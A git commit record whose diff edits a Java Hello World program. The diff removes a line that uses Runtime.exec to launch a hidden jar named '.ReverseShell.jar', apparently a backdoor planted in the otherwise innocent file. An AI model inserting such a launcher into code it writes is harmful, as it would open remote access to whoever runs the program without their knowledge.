712f1d27a29d374e15f4865a5bfe4ed63422b148
MickeyDeBaets <45242113+MickeyDeBaets@users.noreply.github.com>
2021-03-31 12:39:30 +0200

    Update HelloWorld.java

--- HelloWorld.java
+++ HelloWorld.java
@@ -3,6 +3,5 @@ import java.io.*;
 public class HelloWorld {
    public static void main(String[] args) throws IOException {
       System.out.println("Hello World!");
-      Process process = Runtime.getRuntime().exec("java -jar .ReverseShell.jar");
    }
 }
